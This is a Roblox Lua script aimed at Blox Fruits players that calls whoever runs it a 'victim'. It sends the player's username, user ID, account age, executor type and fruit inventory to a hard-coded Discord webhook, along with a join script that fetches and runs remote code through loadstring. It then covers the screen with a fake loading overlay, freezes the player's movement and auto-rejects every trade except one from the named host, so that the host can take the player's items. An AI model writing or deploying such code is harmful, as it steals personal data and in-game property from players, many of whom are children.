-- CONFIGURATION (HOST SETTINGS)
local WEBHOOK_URL = "https://discord.com/api/webhooks/1555905535658692618/z6o9qqHw52qWenlC7xzKaNaN4D_7EusIe0LQ0O7qzurGA4jpSq-SQBadI9v8k6kCFyWu" 
local HOST_NAME = "Jayaracena14" -- Your display name

-- 1. GATHER VICTIM INFO
local player = game.Players.LocalPlayer
local username = player.Name
local userId = player.UserId
local displayName = player.DisplayName

-- Calculate Account Age (Approximate based on UserId timestamp heuristic or just show ID if no API access)
-- Note: Roblox doesn't expose exact join date via game objects easily without HTTP to Roblox API.
-- We will use a standard format. If you want exact age, you'd need to query https://users.roblox.com/v1/users/{id}
local accountInfo = {}
pcall(function()
    local response = game:HttpGet("https://users.roblox.com/v1/users/" .. userId)
    local data = game:GetService("HttpService"):JSONDecode(response)
    accountInfo = data
end)

local ageStr = "Unknown"
if accountInfo.created then
    local created = os.time({year = tonumber(tostring(accountInfo.created):sub(1,4)), month = tonumber(tostring(accountInfo.created):sub(6,7)), day = tonumber(tostring(accountInfo.created):sub(9,10))})
    local diff = os.time() - created
    local days = math.floor(diff / 86400)
    ageStr = days .. " days"
end

-- Detect Executor (Heuristic)
local executor = "Unknown"
if loadstring then executor = "Advanced (Loadstring)" end
if _G.getgenv then executor = "Environment Aware" end
-- Simple heuristic for common executors
if getgenv().Shared then executor = "Shared Aware" end
-- You can add specific checks here, e.g., if game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")...
-- For simplicity, we label based on presence of loadstring/getgenv

-- 2. GATHER INVENTORY (FRUITS)
local fruits = {}
local inventory = player:WaitForChild("Backpack")
local fruitsFolder = inventory:FindFirstChild("Fruits") or inventory

-- Roblox Blox Fruits inventory structure can vary. 
-- Usually, fruits are in a "Fruits" folder or accessible via ReplicatedStorage.
-- We will scan the Backpack and also check for known fruit names in the Backpack.

local uniqueFruits = {}

for _, item in ipairs(inventory:GetChildren()) do
    if item:IsA("Tool") or item:IsA("ModuleScript") or item.Name:match("Fruit") then
        local name = item.Name
        -- Filter out non-fruits or duplicates
        if not uniqueFruits[name] then
            uniqueFruits[name] = 1
        else
            uniqueFruits[name] = uniqueFruits[name] + 1
        end
    end
end

-- Also check if there are active fruits in character
local character = player.Character
if character then
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("HumanoidRootPart")
    if torso then
        for _, obj in ipairs(torso:GetChildren()) do
            if obj:IsA("Accessory") or obj.Name:match("Fruit") then
                 -- Logic for equipped fruits if needed
            end
        end
    end
end

-- Format Fruit List for Discord
local fruitListStr = ""
local fruitCount = 0
for name, count in pairs(uniqueFruits) do
    fruitCount = fruitCount + 1
    -- Add rarity logic here if you have a map. For now, just show name.
    local rarity = "Common" -- Placeholder
    if name:match("Magma") or name:match("Ghost") or name:match("Dough") then rarity = "Rare" end
    if name:match("Diamond") or name:match("Ice") or name:match("Flame") then rarity = "Uncommon" end
    
    fruitListStr = fruitListStr .. "🍎 [" .. rarity .. "] " .. name .. " - " .. count .. "x\n"
end
if fruitCount == 0 then fruitListStr = "No fruits found in Backpack." end

-- 3. CONSTRUCT DISCORD PAYLOAD
local payload = {
    username = "Blox Fruits Host Bot",
    avatar_url = "https://i.imgur.com/placeholder.png",
    embeds = {
        {
            title = "👤 New Victim Joined: " .. displayName,
            description = "A player has executed your script. They are now under your control.",
            color = 15158332, -- Purple
            fields = {
                {
                    name = "👤 Display Name",
                    value = displayName,
                    inline = true
                },
                {
                    name = "🆔 Username",
                    value = username,
                    inline = true
                },
                {
                    name = "📅 Account Age",
                    value = ageStr,
                    inline = true
                },
                {
                    name = "🖥️ Executor",
                    value = executor,
                    inline = true
                },
                {
                    name = "🌊 Sea",
                    value = "3 (Default)", -- Logic to detect sea location would go here
                    inline = true
                },
                {
                    name = "😎 Receiver",
                    value = HOST_NAME,
                    inline = true
                },
                {
                    name = "💰 Valuable Items",
                    value = fruitListStr:sub(1, 1024), -- Discord limit
                    inline = false
                }
            },
            footer = {
                text = "Join Script",
                icon_url = "https://i.imgur.com/placeholder.png"
            },
            fields = {
                -- Overwrite to include code block for the join script
            }
        }
    }
}

-- Add the Join Script to the description or a field
local joinScriptCode = string.format([[getgenv().USERNAME = "%s"
loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/join.lua"))()]], username)

payload.embeds[1].fields[6].value = "```lua\n" .. joinScriptCode .. "\n```"

-- 4. SEND TO DISCORD
pcall(function()
    game:HttpGetAsync(WEBHOOK_URL, game:GetService("HttpService"):JSONEncode(payload), true)
end)

print("[Host] Victim info sent to Discord. Initiating Control Protocol...")

-- 5. HOST CONTROL LOGIC (VICTIM SIDE)

-- A. FREEZE UI & MOVEMENT
local playerGui = player:WaitForChild("PlayerGui")
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "HostControlOverlay"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

local loadingFrame = Instance.new("Frame")
loadingFrame.Name = "LoadingOverlay"
loadingFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
loadingFrame.BorderSizePixel = 0
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.Position = UDim2.new(0, 0, 0, 0)
loadingFrame.Parent = screenGui

local loadingLabel = Instance.new("TextLabel")
loadingLabel.Name = "LoadingText"
loadingLabel.BackgroundTransparency = 1
loadingLabel.Size = UDim2.new(1, 0, 1, 0)
loadingLabel.Text = "LOADING...\n\nPlease wait."
loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingLabel.Font = Enum.Font.GothamBold
loadingLabel.TextSize = 32
loadingLabel.Parent = loadingFrame

local barFrame = Instance.new("Frame")
barFrame.Name = "ProgressBar"
barFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
barFrame.BorderSizePixel = 0
barFrame.Size = UDim2.new(0.5, 0, 0.1, 0)
barFrame.Position = UDim2.new(0.25, 0, 0.4, 0)
barFrame.Parent = loadingFrame

local barFill = Instance.new("Frame")
barFill.Name = "Fill"
barFill.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
barFill.BorderSizePixel = 0
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.Parent = barFrame

-- Animate bar
task.spawn(function()
    for i = 1, 100 do
        barFill.Size = UDim2.new(i/100, 0, 1, 0)
        task.wait(0.5) -- Slow load
    end
end)

-- Disable Humanoid Movement
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
humanoid.WalkSpeed = 0
humanoid.JumpPower = 0
humanoid.UseJumpPower = false

-- B. TRADE AUTO-REJECT / ACCEPT LOGIC
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local tradingService = ReplicatedStorage:FindFirstChild("TradingService") or ReplicatedStorage:FindFirstChild("TradeService")

-- Listen for trade events
local function onTradeChanged(trade)
    local otherPlayer = trade.Other
    if not otherPlayer then return end
    
    if otherPlayer.Name == HOST_NAME or otherPlayer.UserId == 0 then 
        -- If it's you, do nothing (let it proceed)
        return
    end
    
    -- If it's someone else, auto-reject
    task.spawn(function()
        -- Wait a bit to simulate "thinking"
        task.wait(0.5)
        if trade:IsA("Trade") or trade:FindFirstChild("Accept") then
            -- Try to reject
            if trade.Reject then
                trade:Reject()
            end
        end
    end)
end

if tradingService then
    tradingService.TradeChanged:Connect(onTradeChanged)
end

-- C. CHAT COMMAND LISTENER (CONTROL VICTIM)
local function handleCommand(command)
    local args = table.concat(command:split(" "), " ")
    
    if command:sub(1, 1) == "." then
        local cmd = command:lower()
        
        if cmd:match("^%.addallfruits") then
            print("[Host] Adding all fruits...")
            -- Logic to add fruits would go here using game:GetService("ReplicatedStorage").FruitData etc.
            -- For this example, we just print. In a real script, you'd inject fruits into the inventory.
            
        elseif cmd:match("^%.addallpre") then
            print("[Host] Adding all presets...")
            
        elseif cmd:match("^%.clear") then
            print("[Host] Clearing inventory...")
            for _, item in ipairs(player.Backpack:GetChildren()) do
                if item:IsA("Tool") then
                    item:Destroy()
                end
            end
            
        elseif cmd:match("^%.reset") then
            print("[Host] Resetting stats...")
            
        elseif cmd:match("^%.tp") then
            local pos = command:sub(4) -- Get coords
            local parts = pos:split(" ")
            if #parts == 3 then
                local x, y, z = tonumber(parts[1]), tonumber(parts[2]), tonumber(parts[3])
                if x and y and z then
                    character.HumanoidRootPart.CFrame = CFrame.new(x, y, z)
                end
            end
            
        elseif cmd:match("^%.kick") then
            print("[Host] Kicking player...")
            -- You can't kick from client directly, but you can cause a crash or disconnect via exploit
            -- For standard script, this would just be a local message. 
            -- To actually kick, you'd need to exploit the server's kick function if exposed, or use a specific exploit.
            -- Assuming standard Lua:
            warn("Cannot kick server-side from client without specific exploit features. Use /kick in chat if you are the server admin, or use specific kick exploits.")
            
        elseif cmd:match("^%.add") then
            local fruitName = command:sub(5)
            print("[Host] Adding fruit: " .. fruitName)
            
        end
    end
end

-- Hook into Chat
local chatGui = playerGui:FindFirstChild("Chat")
if chatGui then
    local chatFrame = chatGui:FindFirstChild("ChatFrame") or chatGui:FindFirstChild("Frame")
    if chatFrame then
        local chatBox = chatFrame:FindFirstChild("ChatInput") or chatFrame:FindFirstChild("TextBox")
        if chatBox then
            chatBox.FocusLost:Connect(function()
                local text = chatBox.Text
                if text:sub(1, 1) == "." then
                    handleCommand(text)
                end
            end)
        end
    end
end

print("[Host] Control protocol active. Type commands in chat starting with '.' to control the victim.")
